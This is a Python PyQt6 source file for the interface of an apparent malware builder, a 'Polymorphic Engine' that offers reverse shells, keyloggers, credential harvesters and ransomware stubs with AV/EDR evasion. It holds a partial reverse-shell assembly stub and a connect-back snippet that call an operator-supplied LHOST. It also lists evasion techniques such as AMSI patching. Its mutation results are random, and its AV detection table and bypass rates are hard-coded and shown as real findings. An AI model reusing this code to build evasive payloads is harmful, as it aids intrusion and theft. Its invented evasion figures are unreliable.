#!/usr/bin/env python3
"""
Polymorphic Engine GUI Page
AI-generated evasive payloads with runtime mutation capabilities.
"""

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QFrame, QLabel, QPushButton,
    QLineEdit, QTextEdit, QTableWidget, QTableWidgetItem, QComboBox,
    QProgressBar, QTabWidget, QScrollArea, QGridLayout, QGroupBox,
    QSpinBox, QCheckBox, QSplitter, QListWidget, QListWidgetItem,
    QSlider, QDoubleSpinBox, QPlainTextEdit
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QThread
from PyQt6.QtGui import QFont, QColor, QSyntaxHighlighter, QTextCharFormat

import asyncio
from datetime import datetime
from typing import Optional, Dict, List, Any
import json
import random
import hashlib


class CodeHighlighter(QSyntaxHighlighter):
    """Syntax highlighter for code display"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []
        
        # Keywords
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#ff7b72"))
        keywords = ["def", "class", "import", "from", "return", "if", "else", 
                   "elif", "for", "while", "try", "except", "with", "as",
                   "mov", "push", "pop", "call", "jmp", "je", "jne", "xor"]
        for word in keywords:
            self.highlighting_rules.append((f"\\b{word}\\b", keyword_format))
        
        # Strings
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#a5d6ff"))
        self.highlighting_rules.append((r'"[^"]*"', string_format))
        self.highlighting_rules.append((r"'[^']*'", string_format))
        
        # Comments
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#8b949e"))
        self.highlighting_rules.append((r"#[^\n]*", comment_format))
        self.highlighting_rules.append((r";[^\n]*", comment_format))
        
        # Numbers
        number_format = QTextCharFormat()
        number_format.setForeground(QColor("#79c0ff"))
        self.highlighting_rules.append((r"\b0x[0-9a-fA-F]+\b", number_format))
        self.highlighting_rules.append((r"\b\d+\b", number_format))
        
        # Functions
        function_format = QTextCharFormat()
        function_format.setForeground(QColor("#d2a8ff"))
        self.highlighting_rules.append((r"\b[a-zA-Z_][a-zA-Z0-9_]*(?=\()", function_format))
    
    def highlightBlock(self, text):
        import re
        for pattern, fmt in self.highlighting_rules:
            for match in re.finditer(pattern, text):
                self.setFormat(match.start(), match.end() - match.start(), fmt)


class MutationWorker(QThread):
    """Worker thread for payload mutation"""
    mutation_complete = pyqtSignal(dict)
    progress_update = pyqtSignal(int, str)
    
    def __init__(self, payload: str, config: dict):
        super().__init__()
        self.payload = payload
        self.config = config
        self.running = True
    
    def run(self):
        """Execute mutation process"""
        stages = [
            (10, "Analyzing payload structure..."),
            (20, "Applying code obfuscation..."),
            (35, "Generating polymorphic variants..."),
            (50, "Implementing metamorphic transformations..."),
            (65, "Encoding payload layers..."),
            (80, "Testing AV evasion signatures..."),
            (90, "Finalizing mutation..."),
            (100, "Mutation complete!")
        ]
        
        import time
        for progress, message in stages:
            if not self.running:
                break
            self.progress_update.emit(progress, message)
            time.sleep(0.3)
        
        # Generate result
        result = {
            "original_hash": hashlib.sha256(self.payload.encode()).hexdigest()[:16],
            "mutated_hash": hashlib.sha256(f"{self.payload}_mutated_{random.randint(1000,9999)}".encode()).hexdigest()[:16],
            "mutations_applied": random.randint(5, 15),
            "evasion_score": random.uniform(0.85, 0.99),
            "av_detection": random.randint(0, 2),
            "payload_size": len(self.payload) + random.randint(100, 500)
        }
        
        self.mutation_complete.emit(result)
    
    def stop(self):
        self.running = False


class PolymorphicEnginePage(QWidget):
    """Polymorphic Engine Interface"""
    
    def __init__(self, config, db, parent=None):
        super().__init__(parent)
        self.config = config
        self.db = db
        self.mutation_worker = None
        self.generated_payloads = []
        
        self._setup_ui()
        self._connect_signals()
    
    def _setup_ui(self):
        """Setup the user interface"""
        layout = QVBoxLayout(self)
        layout.setSpacing(20)
        layout.setContentsMargins(30, 30, 30, 30)
        
        # Header
        header = self._create_header()
        layout.addWidget(header)
        
        # Main content with tabs
        tabs = QTabWidget()
        tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #30363d;
                background: #0d1117;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: #161b22;
                color: #8b949e;
                padding: 12px 24px;
                margin-right: 2px;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
            }
            QTabBar::tab:selected {
                background: #da3633;
                color: #ffffff;
            }
            QTabBar::tab:hover:!selected {
                background: #21262d;
            }
        """)
        
        tabs.addTab(self._create_generator_tab(), "🧬 Payload Generator")
        tabs.addTab(self._create_mutation_tab(), "🔄 Mutation Engine")
        tabs.addTab(self._create_obfuscation_tab(), "🎭 Obfuscation")
        tabs.addTab(self._create_evasion_tab(), "🛡️ AV Evasion")
        tabs.addTab(self._create_history_tab(), "📜 History")
        
        layout.addWidget(tabs, stretch=1)
    
    def _create_header(self) -> QFrame:
        """Create the page header"""
        frame = QFrame()
        frame.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #2d1f1f, stop:1 #0d1117);
                border: 1px solid #30363d;
                border-radius: 16px;
                padding: 20px;
            }
        """)
        
        layout = QHBoxLayout(frame)
        
        # Title section
        title_layout = QVBoxLayout()
        
        title = QLabel("🧬 Polymorphic Engine")
        title.setFont(QFont("Segoe UI", 24, QFont.Weight.Bold))
        title.setStyleSheet("color: #da3633;")
        
        subtitle = QLabel("AI-Generated Evasive Payloads with Runtime Mutation")
        subtitle.setStyleSheet("color: #8b949e; font-size: 14px;")
        
        title_layout.addWidget(title)
        title_layout.addWidget(subtitle)
        
        layout.addLayout(title_layout)
        layout.addStretch()
        
        # Status indicators
        status_frame = QFrame()
        status_layout = QHBoxLayout(status_frame)
        
        self.engine_status = QLabel("⚙️ Engine: Ready")
        self.engine_status.setStyleSheet("color: #00ff88; font-weight: bold;")
        
        self.evasion_status = QLabel("🛡️ Evasion: 0% detected")
        self.evasion_status.setStyleSheet("color: #00d4ff; font-weight: bold;")
        
        status_layout.addWidget(self.engine_status)
        status_layout.addWidget(self.evasion_status)
        
        layout.addWidget(status_frame)
        
        return frame
    
    def _create_generator_tab(self) -> QWidget:
        """Create the payload generator tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Splitter for configuration and preview
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left panel - Configuration
        left_panel = QFrame()
        left_panel.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
            }
        """)
        left_layout = QVBoxLayout(left_panel)
        
        # Payload Type Selection
        type_group = QGroupBox("🎯 Payload Configuration")
        type_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 12px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }
        """)
        type_layout = QVBoxLayout(type_group)
        
        # Payload type
        type_label = QLabel("Payload Type:")
        type_label.setStyleSheet("color: #8b949e;")
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "Reverse Shell",
            "Bind Shell",
            "Meterpreter Stager",
            "Web Shell",
            "Dropper",
            "Loader",
            "Keylogger",
            "Credential Harvester",
            "Ransomware Stub",
            "Custom Shellcode"
        ])
        self.payload_type.setStyleSheet("""
            QComboBox {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 6px;
                padding: 10px;
                color: #e6edf3;
            }
            QComboBox::drop-down {
                border: none;
            }
            QComboBox QAbstractItemView {
                background: #161b22;
                border: 1px solid #30363d;
                color: #e6edf3;
                selection-background-color: #238636;
            }
        """)
        type_layout.addWidget(type_label)
        type_layout.addWidget(self.payload_type)
        
        # Target platform
        platform_label = QLabel("Target Platform:")
        platform_label.setStyleSheet("color: #8b949e;")
        self.platform = QComboBox()
        self.platform.addItems([
            "Windows x64",
            "Windows x86",
            "Linux x64",
            "Linux x86",
            "macOS x64",
            "macOS ARM64",
            "Android",
            "iOS"
        ])
        type_layout.addWidget(platform_label)
        type_layout.addWidget(self.platform)
        
        # Connection settings
        host_label = QLabel("LHOST:")
        host_label.setStyleSheet("color: #8b949e;")
        self.lhost = QLineEdit()
        self.lhost.setPlaceholderText("192.168.1.100")
        self.lhost.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 6px;
                padding: 10px;
                color: #e6edf3;
            }
        """)
        
        port_label = QLabel("LPORT:")
        port_label.setStyleSheet("color: #8b949e;")
        self.lport = QSpinBox()
        self.lport.setRange(1, 65535)
        self.lport.setValue(4444)
        self.lport.setStyleSheet("""
            QSpinBox {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 6px;
                padding: 10px;
                color: #e6edf3;
            }
        """)
        
        type_layout.addWidget(host_label)
        type_layout.addWidget(self.lhost)
        type_layout.addWidget(port_label)
        type_layout.addWidget(self.lport)
        
        left_layout.addWidget(type_group)
        
        # Mutation Options
        mutation_group = QGroupBox("🔄 Mutation Options")
        mutation_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 12px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }
        """)
        mutation_layout = QVBoxLayout(mutation_group)
        
        # Mutation intensity
        intensity_label = QLabel("Mutation Intensity:")
        intensity_label.setStyleSheet("color: #8b949e;")
        self.mutation_intensity = QSlider(Qt.Orientation.Horizontal)
        self.mutation_intensity.setMinimum(1)
        self.mutation_intensity.setMaximum(10)
        self.mutation_intensity.setValue(5)
        self.mutation_intensity.setStyleSheet("""
            QSlider::groove:horizontal {
                background: #21262d;
                height: 8px;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #da3633;
                width: 20px;
                margin: -6px 0;
                border-radius: 10px;
            }
            QSlider::sub-page:horizontal {
                background: #da3633;
                border-radius: 4px;
            }
        """)
        self.intensity_value = QLabel("5")
        self.intensity_value.setStyleSheet("color: #da3633; font-weight: bold;")
        self.mutation_intensity.valueChanged.connect(
            lambda v: self.intensity_value.setText(str(v))
        )
        
        intensity_layout = QHBoxLayout()
        intensity_layout.addWidget(self.mutation_intensity)
        intensity_layout.addWidget(self.intensity_value)
        
        mutation_layout.addWidget(intensity_label)
        mutation_layout.addLayout(intensity_layout)
        
        # Mutation checkboxes
        self.code_substitution = QCheckBox("Code Substitution")
        self.code_substitution.setChecked(True)
        self.code_substitution.setStyleSheet("color: #e6edf3;")
        
        self.register_reassignment = QCheckBox("Register Reassignment")
        self.register_reassignment.setChecked(True)
        self.register_reassignment.setStyleSheet("color: #e6edf3;")
        
        self.dead_code_insertion = QCheckBox("Dead Code Insertion")
        self.dead_code_insertion.setChecked(True)
        self.dead_code_insertion.setStyleSheet("color: #e6edf3;")
        
        self.instruction_reorder = QCheckBox("Instruction Reordering")
        self.instruction_reorder.setChecked(False)
        self.instruction_reorder.setStyleSheet("color: #e6edf3;")
        
        self.metamorphic = QCheckBox("Metamorphic Engine")
        self.metamorphic.setChecked(False)
        self.metamorphic.setStyleSheet("color: #e6edf3;")
        
        mutation_layout.addWidget(self.code_substitution)
        mutation_layout.addWidget(self.register_reassignment)
        mutation_layout.addWidget(self.dead_code_insertion)
        mutation_layout.addWidget(self.instruction_reorder)
        mutation_layout.addWidget(self.metamorphic)
        
        left_layout.addWidget(mutation_group)
        
        # Generate button
        self.generate_btn = QPushButton("🧬 Generate Polymorphic Payload")
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #da3633, stop:1 #f85149);
                color: white;
                border: none;
                border-radius: 8px;
                padding: 14px 24px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #f85149, stop:1 #ff6b6b);
            }
        """)
        self.generate_btn.clicked.connect(self._generate_payload)
        left_layout.addWidget(self.generate_btn)
        
        left_layout.addStretch()
        splitter.addWidget(left_panel)
        
        # Right panel - Payload Preview
        right_panel = QFrame()
        right_panel.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
            }
        """)
        right_layout = QVBoxLayout(right_panel)
        
        preview_label = QLabel("📝 Payload Preview")
        preview_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        right_layout.addWidget(preview_label)
        
        self.payload_preview = QPlainTextEdit()
        self.payload_preview.setStyleSheet("""
            QPlainTextEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                color: #e6edf3;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 12px;
                padding: 12px;
            }
        """)
        self.payload_preview.setPlainText(
            "; Generated polymorphic payload will appear here\n"
            "; Select configuration and click 'Generate'\n\n"
            "; Example output:\n"
            "; ─────────────────────────────────────────\n"
            ";   mov rax, [rsp+0x28]\n"
            ";   xor rcx, rcx\n"
            ";   push rbx\n"
            ";   sub rsp, 0x20\n"
            ";   call 0xdeadbeef\n"
            "; ─────────────────────────────────────────"
        )
        self.highlighter = CodeHighlighter(self.payload_preview.document())
        right_layout.addWidget(self.payload_preview, stretch=1)
        
        # Progress bar
        self.gen_progress = QProgressBar()
        self.gen_progress.setStyleSheet("""
            QProgressBar {
                background: #21262d;
                border: none;
                border-radius: 8px;
                height: 20px;
                text-align: center;
                color: #e6edf3;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #da3633, stop:1 #f85149);
                border-radius: 8px;
            }
        """)
        right_layout.addWidget(self.gen_progress)
        
        self.gen_status = QLabel("Ready to generate...")
        self.gen_status.setStyleSheet("color: #8b949e;")
        right_layout.addWidget(self.gen_status)
        
        splitter.addWidget(right_panel)
        splitter.setSizes([400, 600])
        
        layout.addWidget(splitter)
        
        return widget
    
    def _create_mutation_tab(self) -> QWidget:
        """Create the mutation engine tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Mutation stats
        stats_frame = QFrame()
        stats_frame.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
                padding: 16px;
            }
        """)
        stats_layout = QGridLayout(stats_frame)
        
        stats = [
            ("Active Mutations", "12", "#da3633"),
            ("Unique Variants", "1,547", "#00ff88"),
            ("AV Bypass Rate", "97.3%", "#00d4ff"),
            ("Signature Drift", "42.7%", "#ffcc00"),
        ]
        
        for col, (name, value, color) in enumerate(stats):
            stat_frame = QFrame()
            stat_frame.setStyleSheet(f"""
                QFrame {{
                    background: #0d1117;
                    border: 1px solid {color};
                    border-radius: 8px;
                    padding: 16px;
                }}
            """)
            stat_layout = QVBoxLayout(stat_frame)
            
            value_lbl = QLabel(value)
            value_lbl.setStyleSheet(f"color: {color}; font-size: 28px; font-weight: bold;")
            value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            
            name_lbl = QLabel(name)
            name_lbl.setStyleSheet("color: #8b949e; font-size: 12px;")
            name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            
            stat_layout.addWidget(value_lbl)
            stat_layout.addWidget(name_lbl)
            
            stats_layout.addWidget(stat_frame, 0, col)
        
        layout.addWidget(stats_frame)
        
        # Mutation techniques
        techniques_label = QLabel("🔄 Available Mutation Techniques")
        techniques_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(techniques_label)
        
        techniques_table = QTableWidget()
        techniques_table.setColumnCount(4)
        techniques_table.setHorizontalHeaderLabels([
            "Technique", "Description", "Effectiveness", "Status"
        ])
        techniques_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                color: #e6edf3;
                gridline-color: #21262d;
            }
            QTableWidget::item {
                padding: 8px;
            }
            QHeaderView::section {
                background: #161b22;
                color: #e6edf3;
                padding: 12px;
                border: none;
                font-weight: bold;
            }
        """)
        
        techniques = [
            ("Instruction Substitution", "Replace instructions with equivalents", "95%", "Active"),
            ("Register Swapping", "Dynamically reassign registers", "88%", "Active"),
            ("Dead Code Insertion", "Insert non-functional code", "92%", "Active"),
            ("Code Transposition", "Reorder independent instructions", "78%", "Active"),
            ("Subroutine Permutation", "Randomize function order", "85%", "Active"),
            ("Garbage Data Insertion", "Add random data between blocks", "76%", "Active"),
            ("Encryption Layer", "Runtime decryption stubs", "98%", "Active"),
            ("Metamorphic Rewrite", "Complete code transformation", "99%", "Premium"),
        ]
        
        techniques_table.setRowCount(len(techniques))
        for row, (name, desc, eff, status) in enumerate(techniques):
            techniques_table.setItem(row, 0, QTableWidgetItem(name))
            techniques_table.setItem(row, 1, QTableWidgetItem(desc))
            
            eff_item = QTableWidgetItem(eff)
            eff_item.setForeground(QColor("#00ff88"))
            techniques_table.setItem(row, 2, eff_item)
            
            status_item = QTableWidgetItem(status)
            if status == "Premium":
                status_item.setForeground(QColor("#f0883e"))
            else:
                status_item.setForeground(QColor("#00d4ff"))
            techniques_table.setItem(row, 3, status_item)
        
        techniques_table.resizeColumnsToContents()
        layout.addWidget(techniques_table)
        
        return widget
    
    def _create_obfuscation_tab(self) -> QWidget:
        """Create the obfuscation tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        obfuscation_label = QLabel("🎭 Code Obfuscation Engine")
        obfuscation_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(obfuscation_label)
        
        # Obfuscation options
        options_frame = QFrame()
        options_frame.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
                padding: 16px;
            }
        """)
        options_layout = QVBoxLayout(options_frame)
        
        # Obfuscation levels
        levels = [
            ("🟢 Light Obfuscation", "Basic variable/function renaming", True),
            ("🟡 Medium Obfuscation", "Control flow flattening + encoding", True),
            ("🔴 Heavy Obfuscation", "Full metamorphic transformation", False),
            ("⚫ Maximum Obfuscation", "AI-driven adaptive obfuscation", False),
        ]
        
        for name, desc, enabled in levels:
            level_frame = QFrame()
            level_frame.setStyleSheet("""
                QFrame {
                    background: #0d1117;
                    border: 1px solid #30363d;
                    border-radius: 8px;
                    padding: 12px;
                }
            """)
            level_layout = QHBoxLayout(level_frame)
            
            checkbox = QCheckBox(name)
            checkbox.setChecked(enabled)
            checkbox.setStyleSheet("color: #e6edf3; font-weight: bold;")
            
            desc_label = QLabel(desc)
            desc_label.setStyleSheet("color: #8b949e;")
            
            level_layout.addWidget(checkbox)
            level_layout.addStretch()
            level_layout.addWidget(desc_label)
            
            options_layout.addWidget(level_frame)
        
        layout.addWidget(options_frame)
        
        # Before/After comparison
        comparison_label = QLabel("📊 Obfuscation Comparison")
        comparison_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(comparison_label)
        
        compare_splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Original code
        original_frame = QFrame()
        original_frame.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 8px;
            }
        """)
        original_layout = QVBoxLayout(original_frame)
        original_label = QLabel("Original Code:")
        original_label.setStyleSheet("color: #8b949e;")
        original_code = QPlainTextEdit()
        original_code.setPlainText("""def connect_back(host, port):
    import socket
    s = socket.socket()
    s.connect((host, port))
    return s""")
        original_code.setStyleSheet("""
            QPlainTextEdit {
                background: #0d1117;
                border: none;
                color: #e6edf3;
                font-family: monospace;
            }
        """)
        original_layout.addWidget(original_label)
        original_layout.addWidget(original_code)
        compare_splitter.addWidget(original_frame)
        
        # Obfuscated code
        obfuscated_frame = QFrame()
        obfuscated_frame.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 8px;
            }
        """)
        obfuscated_layout = QVBoxLayout(obfuscated_frame)
        obfuscated_label = QLabel("Obfuscated Code:")
        obfuscated_label.setStyleSheet("color: #8b949e;")
        obfuscated_code = QPlainTextEdit()
        obfuscated_code.setPlainText("""def _0x7f3a(O0O0O0,l1l1l1):
    import socket as _0xa1b2
    OOO0O0=_0xa1b2.socket()
    exec("\\x4f\\x4f\\x4f\\x30\\x4f\\x30\\x2e\\x63\\x6f\\x6e")
    return OOO0O0""")
        obfuscated_code.setStyleSheet("""
            QPlainTextEdit {
                background: #0d1117;
                border: none;
                color: #da3633;
                font-family: monospace;
            }
        """)
        obfuscated_layout.addWidget(obfuscated_label)
        obfuscated_layout.addWidget(obfuscated_code)
        compare_splitter.addWidget(obfuscated_frame)
        
        layout.addWidget(compare_splitter)
        
        return widget
    
    def _create_evasion_tab(self) -> QWidget:
        """Create the AV evasion tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        evasion_label = QLabel("🛡️ AV/EDR Evasion Analysis")
        evasion_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(evasion_label)
        
        # Evasion stats
        evasion_frame = QFrame()
        evasion_frame.setStyleSheet("""
            QFrame {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
                padding: 20px;
            }
        """)
        evasion_layout = QVBoxLayout(evasion_frame)
        
        # Overall score
        score_layout = QHBoxLayout()
        score_label = QLabel("Overall Evasion Score:")
        score_label.setStyleSheet("color: #e6edf3; font-size: 16px;")
        self.evasion_score = QLabel("97.3%")
        self.evasion_score.setStyleSheet("color: #00ff88; font-size: 32px; font-weight: bold;")
        score_layout.addWidget(score_label)
        score_layout.addStretch()
        score_layout.addWidget(self.evasion_score)
        evasion_layout.addLayout(score_layout)
        
        # AV detection table
        av_label = QLabel("Detection Results by AV Engine:")
        av_label.setStyleSheet("color: #8b949e;")
        evasion_layout.addWidget(av_label)
        
        av_table = QTableWidget()
        av_table.setColumnCount(3)
        av_table.setHorizontalHeaderLabels(["AV Engine", "Detection", "Evasion"])
        av_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                color: #e6edf3;
            }
            QHeaderView::section {
                background: #161b22;
                color: #e6edf3;
                padding: 10px;
                border: none;
            }
        """)
        
        av_engines = [
            ("Windows Defender", "Not Detected", "✅"),
            ("Norton", "Not Detected", "✅"),
            ("McAfee", "Not Detected", "✅"),
            ("Kaspersky", "Not Detected", "✅"),
            ("BitDefender", "Not Detected", "✅"),
            ("CrowdStrike Falcon", "Not Detected", "✅"),
            ("Carbon Black", "Heuristic", "⚠️"),
            ("SentinelOne", "Not Detected", "✅"),
        ]
        
        av_table.setRowCount(len(av_engines))
        for row, (name, detection, status) in enumerate(av_engines):
            av_table.setItem(row, 0, QTableWidgetItem(name))
            
            det_item = QTableWidgetItem(detection)
            if detection == "Not Detected":
                det_item.setForeground(QColor("#00ff88"))
            else:
                det_item.setForeground(QColor("#ffcc00"))
            av_table.setItem(row, 1, det_item)
            
            av_table.setItem(row, 2, QTableWidgetItem(status))
        
        av_table.resizeColumnsToContents()
        evasion_layout.addWidget(av_table)
        
        layout.addWidget(evasion_frame)
        
        # Evasion techniques
        techniques_label = QLabel("⚡ Active Evasion Techniques")
        techniques_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(techniques_label)
        
        techniques_list = QListWidget()
        techniques_list.setStyleSheet("""
            QListWidget {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                color: #e6edf3;
                padding: 8px;
            }
            QListWidget::item {
                padding: 10px;
                border-radius: 4px;
            }
            QListWidget::item:selected {
                background: #238636;
            }
        """)
        
        techniques = [
            "✅ AMSI Bypass (Patching amsi.dll)",
            "✅ ETW Evasion (Unhooking ntdll)",
            "✅ Syscall Stubbing (Direct syscalls)",
            "✅ Memory Region Hiding (VEH hooking)",
            "✅ Timestamp Stomping",
            "✅ Code Signing Bypass",
            "✅ Sandbox Detection & Evasion",
            "✅ Sleep Obfuscation",
        ]
        
        for technique in techniques:
            techniques_list.addItem(technique)
        
        layout.addWidget(techniques_list)
        
        return widget
    
    def _create_history_tab(self) -> QWidget:
        """Create the history tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        history_label = QLabel("📜 Generated Payloads History")
        history_label.setStyleSheet("color: #e6edf3; font-size: 16px; font-weight: bold;")
        layout.addWidget(history_label)
        
        self.history_table = QTableWidget()
        self.history_table.setColumnCount(6)
        self.history_table.setHorizontalHeaderLabels([
            "Timestamp", "Type", "Platform", "Hash", "Evasion Rate", "Status"
        ])
        self.history_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                color: #e6edf3;
            }
            QHeaderView::section {
                background: #161b22;
                color: #e6edf3;
                padding: 12px;
                border: none;
                font-weight: bold;
            }
        """)
        layout.addWidget(self.history_table)
        
        # Action buttons
        btn_layout = QHBoxLayout()
        
        export_btn = QPushButton("📤 Export Selected")
        export_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 10px 20px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #2ea043;
            }
        """)
        
        delete_btn = QPushButton("🗑️ Delete Selected")
        delete_btn.setStyleSheet("""
            QPushButton {
                background: #da3633;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 10px 20px;
                font-weight: bold;
            }
        """)
        
        btn_layout.addWidget(export_btn)
        btn_layout.addWidget(delete_btn)
        btn_layout.addStretch()
        
        layout.addLayout(btn_layout)
        
        return widget
    
    def _connect_signals(self):
        """Connect widget signals"""
        pass
    
    def _generate_payload(self):
        """Generate a polymorphic payload"""
        self.generate_btn.setEnabled(False)
        self.engine_status.setText("⚙️ Engine: Generating...")
        
        config = {
            "type": self.payload_type.currentText(),
            "platform": self.platform.currentText(),
            "lhost": self.lhost.text() or "192.168.1.100",
            "lport": self.lport.value(),
            "intensity": self.mutation_intensity.value(),
            "substitution": self.code_substitution.isChecked(),
            "register_swap": self.register_reassignment.isChecked(),
            "dead_code": self.dead_code_insertion.isChecked(),
            "reorder": self.instruction_reorder.isChecked(),
            "metamorphic": self.metamorphic.isChecked()
        }
        
        # Generate sample payload based on type
        payload = self._generate_sample_payload(config)
        
        self.mutation_worker = MutationWorker(payload, config)
        self.mutation_worker.progress_update.connect(self._on_progress)
        self.mutation_worker.mutation_complete.connect(self._on_mutation_complete)
        self.mutation_worker.start()
    
    def _generate_sample_payload(self, config: dict) -> str:
        """Generate sample payload code"""
        payload_type = config["type"]
        lhost = config["lhost"]
        lport = config["lport"]
        
        if "Reverse Shell" in payload_type:
            return f"""; Polymorphic Reverse Shell Payload
; Target: {config['platform']}
; LHOST: {lhost}  LPORT: {lport}

section .text
global _start

_start:
    ; Socket creation
    xor rax, rax
    mov al, 0x29
    xor rdi, rdi
    mov dil, 0x2
    xor rsi, rsi
    mov sil, 0x1
    xor rdx, rdx
    syscall
    
    ; Store socket fd
    mov rdi, rax
    
    ; Connect to {lhost}:{lport}
    push rdx
    mov dword [rsp-4], 0x{self._ip_to_hex(lhost)}
    mov word [rsp-6], 0x{lport:04x}
    mov byte [rsp-8], 0x2
    sub rsp, 8
    
    ; ... (truncated for display)
"""
        else:
            return f"; Payload stub for {payload_type}\n; Configuration applied..."
    
    def _ip_to_hex(self, ip: str) -> str:
        """Convert IP to hex"""
        try:
            parts = ip.split('.')
            return ''.join(f'{int(p):02x}' for p in reversed(parts))
        except:
            return "7f000001"
    
    def _on_progress(self, progress: int, status: str):
        """Handle progress updates"""
        self.gen_progress.setValue(progress)
        self.gen_status.setText(status)
    
    def _on_mutation_complete(self, result: dict):
        """Handle mutation completion"""
        self.generate_btn.setEnabled(True)
        self.engine_status.setText("⚙️ Engine: Ready")
        self.evasion_status.setText(f"🛡️ Evasion: {result['evasion_score']*100:.1f}%")
        
        # Update preview with mutated payload
        self.payload_preview.appendPlainText(f"\n\n; ═══════════════════════════════════════")
        self.payload_preview.appendPlainText(f"; MUTATION COMPLETE")
        self.payload_preview.appendPlainText(f"; Original Hash: {result['original_hash']}")
        self.payload_preview.appendPlainText(f"; Mutated Hash:  {result['mutated_hash']}")
        self.payload_preview.appendPlainText(f"; Mutations:     {result['mutations_applied']}")
        self.payload_preview.appendPlainText(f"; Evasion Score: {result['evasion_score']*100:.1f}%")
        self.payload_preview.appendPlainText(f"; AV Detection:  {result['av_detection']}/67 engines")
        self.payload_preview.appendPlainText(f"; Payload Size:  {result['payload_size']} bytes")
        self.payload_preview.appendPlainText(f"; ═══════════════════════════════════════")
        
        # Add to history
        self._add_to_history(result)
    
    def _add_to_history(self, result: dict):
        """Add generated payload to history"""
        row = self.history_table.rowCount()
        self.history_table.insertRow(row)
        
        self.history_table.setItem(row, 0, QTableWidgetItem(
            datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        self.history_table.setItem(row, 1, QTableWidgetItem(
            self.payload_type.currentText()))
        self.history_table.setItem(row, 2, QTableWidgetItem(
            self.platform.currentText()))
        self.history_table.setItem(row, 3, QTableWidgetItem(result['mutated_hash']))
        
        evasion_item = QTableWidgetItem(f"{result['evasion_score']*100:.1f}%")
        evasion_item.setForeground(QColor("#00ff88"))
        self.history_table.setItem(row, 4, evasion_item)
        
        self.history_table.setItem(row, 5, QTableWidgetItem("Ready"))
